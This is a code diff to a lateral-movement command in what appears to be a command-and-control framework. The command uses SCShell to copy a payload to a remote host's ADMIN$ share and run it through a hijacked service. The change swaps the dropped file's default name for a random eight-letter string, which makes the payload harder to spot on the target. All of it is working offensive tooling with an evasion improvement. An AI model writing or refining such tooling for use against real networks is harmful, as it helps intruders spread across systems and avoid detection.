@@ -1,5 +1,6 @@
 import conquest 
 import os.path 
+import random
 
 def _scshell(agentId, cmdline, args): 
     target = conquest.get_string(args, 0)
@@ -9,7 +10,7 @@ def _scshell(agentId, cmdline, args):
     share = conquest.get_string(args, 4)
 
     # Format path
-    path = f"\\\\{target}\\{share}\\{name if name else service}"
+    path = f"\\\\{target}\\{share}\\{name if name else ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8))}"
     if not path.endswith(".exe"): path += ".exe"
 
     bof = conquest.modules_root() + "/lateral-movement/scshell/scshell.x64.o"
@@ -31,7 +32,7 @@ cmd_scshell = (
             .addArgString("target", "Target system hostname or IP address.", True)
             .addArgFile("payload", "Path to payload to execute on the target.", True)
             .addFlagString("--service", "service", "Target service (default: defragsvc).", False, "defragsvc")
-            .addFlagString("--name", "name", "Target service name (default: Name of the target service).")
+            .addFlagString("--name", "name", "Target service name (default: Randomized).")
             .addFlagString("--share", "share", "Share for copying payload (default: ADMIN$).", False, "ADMIN$")
             .setHandler(_scshell)            
 ).registerToGroup("lateral movement")
